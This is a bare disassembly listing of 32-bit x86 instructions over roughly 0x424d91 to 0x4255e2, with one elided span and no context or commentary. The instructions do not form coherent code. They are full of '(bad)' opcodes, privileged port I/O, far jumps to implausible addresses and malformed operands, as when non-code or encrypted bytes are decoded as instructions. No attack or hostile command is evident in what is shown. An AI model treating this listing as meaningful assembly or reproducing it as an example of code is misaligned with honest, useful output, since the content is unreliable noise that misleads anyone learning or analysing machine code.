  424d91:	in     al,0x5c
  424d93:	sbb    eax,0x3ecd28bd
  424d98:	mov    eax,0x48ffef7e
  424d9d:	(bad)  [esi-0x7b]
  424da0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424da1:	cld    
  424da2:	mov    dh,BYTE PTR [ebx]
  424da4:	and    BYTE PTR [esi-0x6a],0x5f
  424da8:	bound  eax,QWORD PTR [ebx-0x23]
  424dab:	test   al,0x63
  424dad:	out    0xfb,eax
  424daf:	mov    edi,DWORD PTR [esi]
  424db1:	push   ss
  424db2:	aam    0xaa
  424db4:	outs   dx,BYTE PTR ds:[esi]
  424db5:	ins    DWORD PTR es:[edi],dx
  424db6:	or     eax,0xbfe3561a
  424dbb:	nop
  424dbc:	dec    ebp
  424dbd:	iret   
  424dbe:	cmp    ecx,DWORD PTR [ebp-0x522e5bfa]
  424dc4:	sub    DWORD PTR [ebp-0x2b51e59a],eax
  424dca:	aaa    
  424dcb:	mov    bl,0x5d
  424dcd:	xor    DWORD PTR [edx+0x2e501a7d],ecx
  424dd3:	fidiv  WORD PTR [ebp+edx*2+0xf]
  424dd7:	test   BYTE PTR [ebx-0x13],dh
  424dda:	mov    ecx,0x64446be9
  424ddf:	xchg   DWORD PTR [ebx],ebx
  424de1:	and    ah,BYTE PTR [edi-0xd2590c4]
  424de7:	cs add al,0xd7
  424dea:	sbb    BYTE PTR ds:0xc7a9e959,dh
  424df0:	int    0x25
  424df2:	mov    ch,0xcf
  424df4:	push   eax
  424df5:	leave  
  424df6:	dec    eax
  424df7:	dec    ebp
  424df8:	pop    ecx
  424df9:	jo     0x424dfd
  424dfb:	jmp    0x424db6
  424dfd:	into   
  424dfe:	fdiv   DWORD PTR [esi+0x7b]
  424e01:	iret   
  424e02:	int3   
  424e03:	out    0x7,eax
  424e05:	sbb    al,0xe2
  424e07:	rcl    BYTE PTR [edi],1
  424e09:	addr16 test eax,0x1e7c4a19
  424e0f:	dec    eax
  424e10:	loop   0x424e91
  424e12:	push   es
  424e13:	xor    eax,0x4c2cd681
  424e18:	lea    ecx,[bp+di+0x5c]
  424e1c:	xor    BYTE PTR [esi+ebx*1+0x337a6fe1],dh
  424e23:	mov    esi,0x9fe36598
  424e28:	js     0x424e41
  424e2a:	mov    ds:0xa1f42031,eax
  424e2f:	in     eax,0x7d
  424e31:	xlat   BYTE PTR ds:[ebx]
  424e32:	sub    bh,0x8f
  424e35:	mov    cl,0x9e
  424e37:	mov    ch,0x37
  424e39:	mov    BYTE PTR [ebx-0x3a],cl
  424e3c:	xchg   BYTE PTR [edi+eax*1-0x7a],cl
  424e40:	mov    bh,0x29
  424e42:	add    cl,BYTE PTR ds:0xcf44d342
  424e48:	pop    esp
  424e49:	xlat   BYTE PTR ds:[ebx]
  424e4a:	jg     0x424e8f
  424e4c:	sbb    al,BYTE PTR [ebx]
  424e4e:	push   ebp
  424e4f:	(bad)  
  424e50:	cmp    ah,BYTE PTR [edx]
  424e52:	test   BYTE PTR [eax],dh
  424e54:	pop    esp
  424e55:	and    ecx,ecx
  424e57:	std    
  424e58:	inc    esi
  424e59:	mov    ds:0x953bf59a,eax
  424e5e:	pop    es
  424e5f:	mov    cl,0x13
  424e61:	push   cs
  424e62:	into   
  424e63:	push   es
  424e64:	jg     0x424eb7
  424e66:	fisttp QWORD PTR [edx-0x5b]
  424e69:	xor    eax,0xd53e6633
  424e6e:	or     eax,0xa19fad55
  424e73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424e74:	in     al,dx
  424e75:	mov    DWORD PTR [esi-0x2111155c],esi
  424e7b:	dec    esi
  424e7c:	leave  
  424e7d:	test   al,al
  424e7f:	(bad)  
  424e80:	add    ah,BYTE PTR [edx+0x1b9bf95c]
  424e86:	aam    0xd1
  424e88:	enter  0xce62,0xca
  424e8c:	inc    esi
  424e8d:	vmovddup ymm0,YMMWORD PTR [edi+eax*4]
  424e92:	mov    ebx,0x9d380983
  424e97:	mov    al,ds:0x7602556c
  424e9c:	pusha  
  424e9d:	stos   BYTE PTR es:[edi],al
  424e9e:	ins    DWORD PTR es:[edi],dx
  424e9f:	outs   dx,BYTE PTR ds:[esi]
  424ea0:	test   DWORD PTR [edi],edx
  424ea2:	out    dx,eax
  424ea3:	adc    BYTE PTR [esi+ecx*8-0x40],0xc0
  424ea8:	(bad)  
  424ea9:	xchg   edi,eax
  424eaa:	retf   0xeeed
  424ead:	cmp    al,BYTE PTR [ebp-0x2]
  424eb0:	jmp    0x424e8c
  424eb2:	dec    edx
  424eb3:	rol    BYTE PTR [ebx-0x2e],0x7f
  424eb7:	mov    cl,0x40
  424eb9:	pop    esp
  424eba:	cld    
  424ebb:	mov    cl,0x17
  424ebd:	pop    esi
  424ebe:	inc    edx
  424ebf:	jg     0x424f09
  424ec1:	jge    0x424f41
  424ec3:	ss jns 0x424ef9
  424ec6:	mov    ?,WORD PTR [edx+0x4b]
  424ec9:	mov    cl,0x3c
  424ecb:	fwait
  424ecc:	call   0x54a6:0x4d855238
  424ed3:	hlt    
  424ed4:	ins    BYTE PTR es:[edi],dx
  424ed5:	cmp    al,0xe2
  424ed7:	cmc    
  424ed8:	pusha  
  424ed9:	jp     0x424f18
  424edb:	les    edx,FWORD PTR [edx-0x583aba9c]
  424ee1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424ee2:	mov    edi,ecx
  424ee4:	xor    BYTE PTR [ebx],0x30
  424ee7:	push   0x9514cbaa
  424eec:	add    eax,0x378ddbcf
  424ef1:	in     al,0xf0
  424ef3:	jl     0x424ee7
  424ef5:	sbb    al,0xd4
  424ef7:	mov    ds:0xcba4739e,al
  424efc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424efd:	or     DWORD PTR [edi-0x79],ebx
  424f00:	mov    esi,0xaf4c94ad
  424f05:	sbb    DWORD PTR [edx+0x111492f],0xffffff96
  424f0c:	pop    es
  424f0d:	inc    BYTE PTR [ecx]
  424f0f:	mov    eax,0x959b0adc
  424f14:	cmc    
  424f15:	xor    eax,0xd62b4114
  424f1a:	adc    al,0x1a
  424f1c:	loopne 0x424f8b
  424f1e:	dec    esp
  424f1f:	repz mov dl,BYTE PTR [edi-0x2f]
  424f23:	dec    eax
  424f24:	lods   al,BYTE PTR ds:[esi]
  424f25:	(bad)
  424f28:	push   ebx
  424f29:	repnz mov ?,WORD PTR [esi]
  424f2c:	fimul  DWORD PTR [edx-0x7b4f27e6]
  424f32:	arpl   WORD PTR [edx+0x2cfbd5bf],bp
  424f38:	out    0x14,eax
  424f3a:	lock cmp ch,BYTE PTR [ebx+0x6e]
  424f3e:	fcmovne st,st(0)
  424f40:	out    0xf8,al
  424f42:	gs out 0xd7,al
  424f45:	cdq    
  424f46:	xor    ebp,edx
  424f48:	jmp    0x27c01a6
  424f4d:	les    ebx,FWORD PTR [ecx-0x13]
  424f50:	mov    al,0xc2
  424f52:	dec    eax
  424f53:	fidivr DWORD PTR [ebx+0x3e]
  424f56:	xor    BYTE PTR [ebx-0x48210c41],bh
  424f5c:	aam    0x62
  424f5e:	imul   edx,DWORD PTR [eax-0x5e],0x26
  424f62:	je     0x424f5d
  424f64:	xor    al,0x63
  424f66:	push   ebp
  424f67:	aaa    
  424f68:	enter  0x9cae,0xda
  424f6c:	aam    0x2
  424f6e:	daa    
  424f6f:	inc    edi
  424f70:	jnp    0x424f7f
  424f72:	and    BYTE PTR ds:0x7d235f3a,dh
  424f78:	xor    DWORD PTR [eax-0x3],ebp
  424f7b:	mov    BYTE PTR [ebp-0x40],0x98
  424f7f:	shl    DWORD PTR [edx-0x2c9903de],0x56
  424f86:	jmp    0x645e3276
  424f8b:	mov    esp,0xc4a76911
  424f90:	mov    al,0xa8
  424f92:	(bad)  
  424f93:	scas   al,BYTE PTR es:[edi]
  424f94:	pop    edi
  424f95:	idiv   al
  424f97:	fild   WORD PTR [edi-0xbe25631]
  424f9d:	test   bh,al
  424f9f:	and    ebp,DWORD PTR [ebx]
  424fa1:	sbb    edi,esp
  424fa3:	cli    
  424fa4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424fa5:	pop    esi
  424fa6:	stos   DWORD PTR es:[edi],eax
  424fa7:	add    BYTE PTR ds:0xb23cea66,ch
  424fad:	sbb    ch,bl
  424faf:	sar    BYTE PTR [ebp+ebp*8+0x7a],cl
  424fb3:	xchg   BYTE PTR ds:0xa24d1c4,dl
  424fb9:	retf   0xfd85
  424fbc:	push   edx
  424fbd:	mov    ecx,0xfdbbabc6
  424fc2:	pop    esi
  424fc3:	lea    ebx,[edi]
  424fc5:	cs std 
  424fc7:	jmp    0x222dd243
  424fcc:	inc    eax
  424fcd:	mov    al,0xf7
  424fcf:	mov    al,0xa1
  424fd1:	add    ebx,0xecebaa1f
  424fd7:	lods   al,BYTE PTR ds:[esi]
  424fd8:	lds    esi,FWORD PTR [edx-0xc]
  424fdb:	cwde   
  424fdc:	add    eax,0x3a48495f
  424fe1:	add    DWORD PTR [ebx-0x68],ecx
  424fe4:	jae    0x424fd8
  424fe6:	xchg   esp,eax
  424fe7:	mov    eax,0x1cbac5d2
  424fec:	or     BYTE PTR [ecx],ch
  424fee:	dec    eax
  424fef:	adc    eax,0x68e7f1c9
  424ff4:	xchg   edx,eax
  424ff5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424ff6:	loopne 0x424f8f
  424ff8:	add    ecx,DWORD PTR [ebx+edx*4]
  424ffb:	mov    ds:0x4f6b46d6,al
  425000:	rol    DWORD PTR [esi+edi*4-0x35],0xf4
  425005:	repnz stos DWORD PTR es:[edi],eax
  425007:	and    BYTE PTR [edi+0x416eb744],dh
  42500d:	xchg   al,al
  42500f:	in     eax,dx
  425010:	aaa    
  425011:	mov    eax,0xfb51806d
  425016:	push   0x5ff13e4c
  42501b:	ret    0xa59f
  42501e:	inc    edx
  42501f:	mov    BYTE PTR [ecx+0x71],ah
  425022:	fcom   QWORD PTR [esi+0x69b33b7e]
  425028:	xchg   esp,eax
  425029:	pop    ebx
  42502a:	sub    bh,dh
  42502c:	call   0x2808:0xe57ceacf
  425033:	add    al,0x17
  425035:	mov    ch,al
  425037:	jl     0x425061
  425039:	or     eax,0xf456e160
  42503e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42503f:	sub    al,0x8c
  425041:	test   eax,0xeebf60ae
  425046:	xchg   ebp,eax
  425047:	push   esi
  425048:	inc    ecx
  425049:	popf   
  42504a:	sub    eax,0x19a21584
  42504f:	push   0x4bb63875
  425054:	int3   
  425055:	loop   0x425088
  425057:	sub    BYTE PTR [edx+0x17],bh
  42505a:	pusha  
  42505b:	jg     0x425069
  42505d:	ret    
  42505e:	jnp    0x425041
  425060:	leave  
  425061:	sbb    eax,0x298463e8
  425066:	fisubr DWORD PTR [edx+0x14]
  425069:	test   DWORD PTR [edi-0x74],esi
  42506c:	dec    edi
  42506d:	(bad)  
  42506e:	pop    esi
  42506f:	xchg   esp,eax
  425070:	push   ebp
  425071:	rcl    DWORD PTR [edx+0x342bcd1b],1
  425077:	loop   0x4250ca
  425079:	(bad)  [esp+ebp*1-0x2a8cc7e0]
  425080:	icebp  
  425081:	mov    dh,0xf9
  425083:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425084:	cmp    DWORD PTR [ebp-0x3b],0x7f
  425088:	mov    DWORD PTR [edi+eiz*1-0x1c2b6cb3],0xf1b48336
  425093:	jl     0x425030
  425095:	ins    BYTE PTR es:[edi],dx
  425096:	inc    esi
  425097:	sahf   
  425098:	jbe    0x425113
  42509a:	mov    gs:0xba10c9e,eax
  4250a0:	retf   
  4250a1:	cmp    bl,BYTE PTR [eax]
  4250a3:	int3   
  4250a4:	fdivr  st,st(1)
  4250a6:	(bad)  
  4250a7:	(bad)  
  4250a8:	sbb    ebp,DWORD PTR [esi+0x5b]
  4250ab:	aaa    
  4250ac:	icebp  
  4250ad:	(bad)  
  4250af:	dec    edx
  4250b0:	pop    ecx
  4250b1:	dec    eax
  4250b2:	jp     0x4250b8
  4250b4:	ja     0x425058
  4250b6:	inc    BYTE PTR [ebp+0x13f2efe3]
  4250bc:	ja     0x42512b
  4250be:	jp     0x42504b
  4250c0:	jle    0x4250f7
  4250c2:	mov    WORD PTR [ecx-0x7b],fs
  4250c5:	dec    eax
  4250c6:	out    dx,al
  4250c7:	dec    eax
  4250c8:	push   0x8644a5
  4250cd:	jnp    0x425115
  4250cf:	cmp    al,0x7
  4250d1:	(bad)  
  4250d2:	daa    
  4250d3:	mov    edi,0x565eb2ba
  4250d8:	lods   eax,DWORD PTR ds:[esi]
  4250d9:	ds push edx
  4250db:	ins    DWORD PTR es:[edi],dx
  4250dc:	sub    eax,0x9199f766
  4250e1:	or     al,0x5d
  4250e3:	jge    0x4250a3
  4250e5:	sub    BYTE PTR [ebx],bl
  4250e7:	xchg   ebp,eax
  4250e8:	cmp    al,0xb
  4250ea:	xchg   edi,eax
  4250eb:	fsub   DWORD PTR [ebx+0x171d5612]
  4250f1:	rcr    BYTE PTR [ecx],cl
  4250f3:	in     eax,dx
  4250f4:	cmp    esi,DWORD PTR [ecx-0x30]
  4250f7:	mov    al,bh
  4250f9:	repz sbb al,BYTE PTR [ecx]
  4250fc:	jne    0x425108
  4250fe:	les    ecx,FWORD PTR [eax-0x60]
  425101:	mov    al,cs:0x53f752ed
  425107:	pop    edi
  425108:	ja     0x425172
  42510a:	fwait
  42510b:	addr16 les ecx,FWORD PTR [bx+si]
  42510f:	inc    esp
  425110:	inc    eax
  425111:	mov    BYTE PTR [esi+0x1d],ah
  425114:	adc    DWORD PTR [ebx-0x16],0xfffffffd
  425118:	adc    al,0xf4
  42511a:	or     eax,0x1f29e7f4
  42511f:	fld    DWORD PTR [esi+0x16]
  425122:	add    eax,0x43c57e36
  425127:	pop    esi
  425128:	icebp  
  425129:	add    DWORD PTR [edx-0x70],ecx
  42512c:	loop   0x4250c4
  42512e:	sbb    DWORD PTR [edi+esi*8+0x64],edi
  425132:	jle    0x425101
  425134:	jns    0x4250cb
  425136:	bound  ebx,QWORD PTR [eax-0x2d527ec]
  42513c:	fstp   QWORD PTR ds:0x423c8aaa
  425142:	outs   dx,DWORD PTR ds:[esi]
  425143:	ja     0x42516b
  425145:	cmp    al,0x1b
  425147:	mov    esi,0x6b632554
  42514c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42514d:	push   ss
  42514e:	cs fwait
  425150:	in     eax,0x5f
  425152:	jne    0x425181
  425154:	retf   
  425155:	push   cs
  425156:	test   al,0x4f
  425158:	call   0x5ef78e3e
  42515d:	test   BYTE PTR [eax-0x2f251123],cl
  425163:	imul   edi,DWORD PTR [esi],0x4c
  425166:	retf   
  425167:	out    0xa8,al
  425169:	adc    DWORD PTR [edi],edi
  42516b:	or     ecx,DWORD PTR [ebx+0x5d725da8]
  425171:	lods   al,BYTE PTR ds:[esi]
  425172:	pop    dx
  425174:	dec    esi
  425175:	xchg   ebp,eax
  425176:	shl    DWORD PTR [esi-0x7eda8b0f],0x32
  42517d:	inc    edi
  42517e:	icebp  
  42517f:	mov    bl,0x8f
  425181:	adc    eax,0xa6b945dd
  425186:	jne    0x4251cd
  425188:	and    esp,DWORD PTR [ebx-0x655ebd19]
  42518e:	adc    BYTE PTR [edi+edi*1+0x8],bh
  425192:	sub    eax,0x4f783740
  425197:	sbb    ebp,DWORD PTR [ecx-0x7089058b]
  42519d:	mov    cl,BYTE PTR [ebx]
  42519f:	dec    edx
  4251a0:	push   esi
  4251a1:	retf   0x75e9
  4251a4:	push   ss
  4251a5:	or     al,0xc5
  4251a7:	mov    eax,ds:0x44ba7602
  4251ac:	pop    ecx
  4251ad:	mov    al,0x82
  4251af:	leave  
  4251b0:	adc    DWORD PTR [eax-0x48f55780],esi
  4251b6:	lahf   
  4251b7:	push   edx
  4251b8:	xchg   ebx,eax
  4251b9:	pop    ebp
  4251ba:	dec    eax
  4251bb:	sub    DWORD PTR [eax],edx
  4251bd:	fdivrp st(2),st
  4251bf:	dec    edi
  4251c0:	gs daa 
  4251c2:	cmp    BYTE PTR [ebx+0x41],bh
  4251c5:	xor    ah,BYTE PTR [edi-0x30]
  4251c8:	cdq    
  4251c9:	sahf   
  4251ca:	je     0x42519e
  4251cc:	mov    eax,ds:0x63a4ce77
  4251d1:	and    BYTE PTR [edx-0x24a85ef],ah
  4251d7:	push   es
  4251d8:	retf   0xb13
  4251db:	xchg   esi,eax
  4251dc:	pop    eax
  4251dd:	cmp    eax,0xea723824
  4251e2:	xor    ah,BYTE PTR [ebx+0x1f]
  4251e5:	lock daa 
  4251e7:	and    al,BYTE PTR [edi-0x76]
  4251ea:	leave  
  4251eb:	or     al,0x6e
  4251ed:	dec    ebx
  4251ee:	xchg   ebx,eax
  4251ef:	mov    dl,BYTE PTR fs:[ecx-0x3ef6a988]
  4251f6:	out    dx,eax
  4251f7:	je     0x4251d1
  4251f9:	arpl   WORD PTR fs:[edx+0x16],sp
  4251fd:	or     DWORD PTR [ebp+0x51],esp
  425200:	les    ecx,FWORD PTR [ebp-0x244f4d5a]
  425206:	xchg   esp,eax
  425207:	shl    DWORD PTR [edx+0x5e],1
  42520a:	iret   
  42520b:	sbb    eax,0xd8863e2
  425210:	sbb    eax,0x2255ad6e
  425215:	adc    al,0xd5
  425217:	cs and eax,0xdd3d59c
  42521d:	and    al,0x31
  42521f:	ret    0x6117
  425222:	nop
  425223:	xchg   esi,eax
  425224:	xlat   BYTE PTR ds:[ebx]
  425225:	mov    ah,0x34
  425227:	sbb    al,0x9
  425229:	jle    0x425222
  42522b:	lods   al,BYTE PTR ds:[esi]
  42522c:	pop    ebp
  42522d:	push   0x41e0fc13
  425232:	js     0x4251cb
  425234:	lds    ecx,FWORD PTR [bp+0x5e]
  425238:	stc    
  425239:	cmp    DWORD PTR [ecx],ecx
  42523b:	mov    bl,0x1a
  42523d:	in     eax,0x62
  42523f:	mov    ds:0x8e69ba,al
  425244:	mov    dh,0xae
  425246:	jecxz  0x425253
  425248:	js     0x425223
  42524a:	ret    
  42524b:	sbb    esp,DWORD PTR [ecx-0xdc273d6]
  425251:	sub    al,0xd5
  425253:	or     eax,0xef934ef8
  425258:	(bad)  
  425259:	xor    al,BYTE PTR [ecx-0x2c]
  42525c:	lahf   
  42525d:	lahf   
  42525e:	push   ecx
  42525f:	lock inc esp
  425261:	mov    ecx,0x92f351e3
  425266:	dec    ebx
  425267:	fstp   DWORD PTR [esi]
  425269:	xchg   sp,sp
  42526c:	and    eax,0x331d1961
  425271:	inc    ebx
  425272:	clc    
  425273:	out    dx,eax
  425274:	psubq  mm6,QWORD PTR [eax]
  425277:	pop    esp
  425278:	outs   dx,DWORD PTR ds:[esi]
  425279:	mov    ds:0xb42871a6,eax
  42527e:	scas   al,BYTE PTR es:[edi]
  42527f:	stos   BYTE PTR es:[edi],al
  425280:	sti    
  425281:	das    
  425282:	ret    0xb99f
  425285:	outs   dx,DWORD PTR ds:[esi]
  425286:	test   dh,dh
  425288:	out    dx,al
  425289:	add    DWORD PTR [ebx-0x28226048],0xffffff81
  425290:	sub    eax,0xd409fbb3
  425295:	(bad)  
  425296:	dec    ebx
  425297:	cmp    DWORD PTR [edx+edi*8-0x5b5adc0e],0xe225be4b
  4252a2:	cld    
  4252a3:	sub    dl,cl
  4252a5:	sbb    bl,al
  4252a7:	stc    
  4252a8:	dec    esp
  4252a9:	test   BYTE PTR ds:0x983da472,bh
  4252af:	or     eax,0x47ab57a7
  4252b4:	dec    esi
  4252b5:	push   0x6a
  4252b7:	scas   eax,DWORD PTR es:[edi]
  4252b8:	in     al,0x97
  4252ba:	ins    DWORD PTR es:[edi],dx
  4252bb:	pmaddwd mm0,QWORD PTR [ecx+0x8b5754d]
  4252c2:	out    0x4f,eax
  4252c4:	pop    es
  4252c5:	or     eax,DWORD PTR [edx]
  4252c7:	xchg   ecx,eax
  4252c8:	in     al,dx
  4252c9:	pusha  
  4252ca:	(bad)  
  4252cb:	mov    esi,0xcc218efe
  4252d0:	xor    ebp,0x2f
  4252d3:	sbb    BYTE PTR [ecx-0x77],bh
  4252d6:	int3   
  4252d7:	add    dh,BYTE PTR ds:0xe0db0d5e
  4252dd:	inc    eax
  4252de:	in     eax,dx
  4252df:	popa   
  4252e0:	adc    eax,0xd02ed8c3
  4252e5:	sbb    BYTE PTR [ebx],0x42
  4252e8:	test   al,0xde
  4252ea:	fsubrp st(4),st
  4252ec:	mov    ebx,0x7f912f36
  4252f1:	dec    esi
  4252f2:	push   es
  4252f3:	dec    esp
  4252f4:	aaa    
  4252f5:	inc    ebp
  4252f6:	sub    cl,dh
  4252f8:	add    BYTE PTR cs:[esp+ecx*8+0x58b34309],ch
  425300:	cmp    DWORD PTR [edx],esp
  425302:	mov    edi,0xd24d31c7
  425307:	push   edi
  425308:	push   es
  425309:	sahf   
  42530a:	xchg   edx,eax
  42530b:	xlat   BYTE PTR ds:[ebx]
  42530c:	pop    edx
  42530d:	sahf   
  42530e:	push   edi
  42530f:	in     eax,0x7
  425311:	adc    BYTE PTR [eax+0x47f22963],ah
  425317:	add    BYTE PTR [edx-0x25e7bb7d],bl
  42531d:	inc    ecx
  42531e:	or     bl,ah
  425320:	mov    esi,0x46d4dd07
  425325:	fdivr  QWORD PTR [eax+0xd3c35f0]
  42532b:	mov    edx,0x2994c660
  425330:	mov    bh,0xc2
  425332:	inc    eax
  425333:	(bad)  
  425334:	leave  
  425335:	pop    esp
  425336:	outs   dx,BYTE PTR ds:[esi]
  425337:	ds scas al,BYTE PTR es:[edi]
  425339:	xchg   edx,eax
  42533a:	sub    ch,al
  42533c:	out    dx,al
  42533d:	sub    BYTE PTR [esi+eax*1],dl
  425340:	pop    ebp
  425341:	push   edx
  425342:	test   DWORD PTR [ebp+0x1d],0x9241cf70
  425349:	push   ds
  42534a:	dec    esi
  42534b:	push   0xdc6485b4
  425350:	xchg   ebp,eax
  425351:	shl    DWORD PTR [esi],cl
  425353:	outs   dx,BYTE PTR ds:[esi]
  425354:	cwde   
  425355:	mov    fs,WORD PTR [ebx+0x22cf93b]
  42535b:	mov    di,WORD PTR [edx+0x24f3769d]
  425362:	rol    dh,0x74
  425365:	jle    0x425382
  425367:	mov    ah,BYTE PTR [edi+0x17]
  42536a:	jmp    0xa79778cb
  42536f:	fwait
  425370:	nop
  425371:	dec    edx
  425372:	stc    
  425373:	adc    eax,0x82bd7db5
  425378:	aad    0x42
  42537a:	dec    edi
  42537b:	adc    al,0x67
  42537d:	fisubr WORD PTR [ebp-0x15b2198f]
  425383:	js     0x425377
  425385:	ret    0x221e
  425388:	mov    DWORD PTR [edx],esi
  42538a:	add    ebp,DWORD PTR [ebx+0x466d9223]
  425390:	sub    DWORD PTR [edi],0xffffffad
  425393:	jl     0x4253f5
  425395:	xchg   edx,eax
  425396:	repnz mov bl,0xad
  425399:	cmp    eax,0x34dcd743
  42539e:	add    al,0xa3
  4253a0:	gs (bad) 
  4253a2:	adc    eax,0x2e0b92ee
  4253a7:	inc    ebp
  4253a8:	loope  0x42540c
  4253aa:	cld    
  4253ab:	cmp    dl,BYTE PTR [ecx+0x6a]
  4253ae:	push   ss
  4253af:	pop    es
  4253b0:	fs add eax,0xbeedfbf5
  4253b6:	xchg   edx,ecx
  4253b8:	mov    cl,0x60
  4253ba:	fcomp  st(0)
  4253bc:	and    BYTE PTR [ebx],ch
  4253be:	pop    esi
  4253bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4253c0:	mov    al,ds:0x21c3d50e
  4253c5:	add    eax,0xf574b4a8
  4253ca:	xchg   edi,eax
  4253cb:	fs icebp 
  4253cd:	jmp    0x4253bc
  4253cf:	inc    ebp
  4253d0:	mov    ebp,0x1b013ca1
  4253d5:	mov    ecx,0xa57f0301
  4253da:	pushf  
  4253db:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4253dd:	mov    ecx,0x2f045fe9
  4253e2:	push   ds
  4253e3:	and    edx,DWORD PTR [ecx+0x4255e664]
  4253e9:	test   al,0xf1
  4253eb:	sbb    dh,dl
  4253ed:	imul   eax,DWORD PTR [esi-0x63a9a405],0xffffffca
  4253f4:	pusha  
  4253f5:	scas   al,BYTE PTR es:[edi]
  4253f6:	cli    
  4253f7:	mov    ah,0xb9
  4253f9:	adc    edi,DWORD PTR [eax]
  4253fb:	adc    eax,0x568b6b4
  425400:	pop    esp
  425401:	imul   ecx,DWORD PTR [ebx-0x54bb017e],0x35e851ec
  42540b:	lahf   
  42540c:	mov    al,0xb6
  42540e:	jae    0x4253b8
  425410:	jg     0x4253ce
  425412:	iret   
  425413:	cmp    eax,0x94c101d5
  425418:	pop    ebp
  425419:	inc    eax
  42541a:	sti    
  42541b:	xlat   BYTE PTR ds:[ebx]
  42541c:	pop    edx
  42541d:	mov    eax,0xdb68219e
  425422:	dec    edx
  425423:	loope  0x4253b5
  425425:	shl    BYTE PTR [ebx],cl
  425427:	aad    0x8b
  425429:	out    dx,eax
  42542a:	and    al,0xa9
  42542c:	inc    esp
  42542d:	sbb    ecx,DWORD PTR [esi-0x63]
  425430:	xchg   BYTE PTR [esi-0x3a],cl
  425433:	aam    0x12
  425435:	(bad)  
  425436:	push   ds
  425437:	push   cs
  425438:	mov    ah,0xbc
  42543a:	call   FWORD PTR [ecx-0x6f4f3975]
  425440:	xor    al,0xb4
  425442:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425443:	sbb    esp,DWORD PTR [ebx-0x5a]
  425446:	imul   DWORD PTR [ebx-0xa0f3dce]
  42544c:	sbb    al,BYTE PTR [edx]
  42544e:	mov    al,0x8a
  425450:	or     DWORD PTR [esi-0x48497f34],edi
  425456:	jbe    0x4254c6
  425458:	add    BYTE PTR [ebp-0x467057b5],bh
  42545e:	shr    DWORD PTR gs:[ebp+0x7481fab1],cl
  425465:	into   
  425466:	leave  
  425467:	push   ds
  425468:	jp     0x4254de
  42546a:	sbb    al,bl
  42546c:	or     dh,cl
  42546e:	enter  0x4bda,0x7
  425472:	sbb    bl,BYTE PTR [ebx]
  425474:	outs   dx,DWORD PTR ds:[esi]
  425475:	mov    dl,BYTE PTR [edi+0x4f]
  425478:	or     BYTE PTR [esi+ebp*4],bl
  42547b:	or     al,0x19
  42547d:	shl    ch,cl
  42547f:	cdq    
  425480:	jne    0x42541a
  425482:	or     esi,DWORD PTR [ecx]
  425484:	scas   eax,DWORD PTR es:[edi]
  425485:	inc    esp
  425486:	jp     0x4254db
  425488:	mov    BYTE PTR [esi+0x17],ch
  42548b:	sahf   
  42548c:	jae    0x425478
  42548e:	xor    BYTE PTR [edx-0x2a7d416c],cl
  425494:	lahf   
  425495:	pop    sp
  425497:	mov    esp,0xf070
	...
  425514:	xor    eax,esp
  425516:	loope  0x4254d1
  425518:	icebp  
  425519:	mov    ecx,0xab3fe879
  42551e:	in     al,0x3
  425520:	test   eax,0x8d8f6bd8
  425525:	call   0x7b0552b
  42552a:	add    BYTE PTR [eax],al
  42552c:	push   esp
  42552d:	pusha  
  42552e:	and    edi,DWORD PTR [eax+0x3d]
  425531:	mov    al,0x1b
  425533:	jl     0x425510
  425535:	xchg   ebp,eax
  425536:	and    al,0x10
  425538:	xchg   ebx,eax
  425539:	push   esi
  42553a:	push   esp
  42553b:	xlat   BYTE PTR ds:[ebx]
  42553c:	retf   0x52f1
  42553f:	pop    ss
  425540:	cli    
  425541:	ins    DWORD PTR es:[edi],dx
  425542:	fsub   DWORD PTR [ecx+0x6336022f]
  425548:	jns    0x4255c0
  42554a:	das    
  42554b:	mov    al,ds:0x5f0a428a
  425550:	push   ss
  425551:	lea    edi,[ebx-0x3]
  425554:	xchg   edx,eax
  425555:	repnz dec ebx
  425557:	cmp    BYTE PTR [edi+0x69],bl
  42555a:	dec    ebx
  42555b:	mov    bl,0x3c
  42555d:	call   0x3b03:0xd28a782d
  425564:	js     0x425591
  425566:	pushf  
  425567:	call   0x339b3499
  42556c:	cmp    BYTE PTR [edi],0x6d
  42556f:	add    al,0x54
  425571:	jmp    0xb9a8:0x78d2c04
  425578:	retf   0xdf18
  42557b:	aas    
  42557c:	mov    BYTE PTR [eax+0x10],ah
  42557f:	loope  0x425573
  425581:	and    eax,DWORD PTR ds:0x5242afb6
  425587:	imul   esi,ebx,0xffffffb9
  42558a:	cmp    edi,DWORD PTR [edi]
  42558c:	(bad)  
  42558d:	mov    ebx,0x5d075a63
  425592:	mov    gs,WORD PTR [edx+0x36]
  425595:	mov    ds,WORD PTR [ecx]
  425597:	adc    eax,0x322bb1af
  42559c:	mov    ds:0xdaf3ca61,al
  4255a1:	cs pop ss
  4255a3:	dec    edx
  4255a4:	bound  esp,QWORD PTR [eax-0x7d985c36]
  4255aa:	dec    eax
  4255ab:	sbb    DWORD PTR [ebx],ecx
  4255ad:	add    bl,0x96
  4255b0:	cmp    DWORD PTR [ebp-0x65],edx
  4255b3:	mov    dl,0xdb
  4255b5:	lods   eax,DWORD PTR ds:[esi]
  4255b6:	and    ebp,esp
  4255b8:	mov    bl,0xbe
  4255ba:	adc    dh,BYTE PTR [ecx-0x49fd60f4]
  4255c0:	lock push cs
  4255c2:	imul   DWORD PTR [ecx]
  4255c4:	addr16 dec eax
  4255c6:	push   DWORD PTR [ebp-0x74]
  4255c9:	adc    bl,al
  4255cb:	and    BYTE PTR [ecx-0x63],bh
  4255ce:	in     eax,dx
  4255cf:	dec    ebp
  4255d0:	mov    eax,0x94e77446
  4255d5:	test   eax,0xec9321a8
  4255da:	push   esp
  4255db:	mov    es,WORD PTR [edx+0x47]
  4255de:	(bad)  
  4255df:	sub    bl,BYTE PTR [edi]
  4255e1:	push   esp
  4255e2:	in     eax,dx
